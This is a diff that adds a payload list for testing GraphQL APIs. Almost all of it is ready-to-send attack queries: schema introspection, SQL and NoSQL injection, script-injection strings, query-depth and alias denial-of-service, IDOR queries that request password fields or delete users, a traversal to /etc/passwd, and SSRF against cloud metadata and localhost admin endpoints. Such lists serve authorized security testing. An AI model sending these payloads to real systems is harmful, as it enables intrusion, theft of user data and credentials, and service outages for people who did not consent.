@@ -1,0 +1,45 @@
+# GraphQL Testing Payloads
+# Format: QUERY (as single line)
+
+# ==== Introspection Queries ====
+{"query":"{ __schema { types { name } } }"}
+{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}
+{"query":"{ __schema { types { name kind fields { name type { name } } } } }"}
+{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}
+{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields { name args { name type { name } } type { name } } }"}
+
+# ==== SQL Injection in GraphQL ====
+{"query":"{ user(id: \"1' OR '1'='1\") { id name } }"}
+{"query":"{ users(filter: \"admin'--\") { id email } }"}
+{"query":"mutation { login(username: \"admin'--\", password: \"x\") { token } }"}
+{"query":"{ search(query: \"' UNION SELECT NULL--\") { results } }"}
+
+# ==== NoSQL Injection in GraphQL ====
+{"query":"{ user(id: {\"$ne\": \"\"}) { id name } }"}
+{"query":"mutation { auth(user: {\"$gt\": \"\"}) { success } }"}
+
+# ==== XSS via GraphQL ====
+{"query":"mutation { createComment(text: \"<script>alert(1)</script>\") { id } }"}
+{"query":"mutation { updateProfile(name: \"<svg/onload=alert(1)>\") { success } }"}
+
+# ==== Nested Query DoS (Query Depth) ====
+{"query":"{ user { friends { friends { friends { friends { name } } } } } }"}
+{"query":"{ a: user { b: friends { c: friends { d: friends { e: friends { name } } } } } }"}
+
+# ==== Alias-based DoS ====
+{"query":"{ a: user(id:1) { name } b: user(id:1) { name } c: user(id:1) { name } d: user(id:1) { name } e: user(id:1) { name } }"}
+
+# ==== Batch Query Attack ====
+[{"query":"{ user(id:1) { name } }"},{"query":"{ user(id:2) { name } }"},{"query":"{ user(id:3) { name } }"}]
+
+# ==== IDOR via GraphQL ====
+{"query":"{ user(id: 1) { id email password role } }"}
+{"query":"{ user(id: 2) { id email password role } }"}
+{"query":"mutation { deleteUser(id: 1) { success } }"}
+
+# ==== File Upload Mutations ====
+{"query":"mutation { uploadFile(file: \"../../../etc/passwd\") { path } }"}
+
+# ==== SSRF via GraphQL ====
+{"query":"mutation { fetch(url: \"http://169.254.169.254/latest/meta-data/\") { content } }"}
+{"query":"{ proxy(target: \"http://127.0.0.1:8080/admin\") { response } }"}
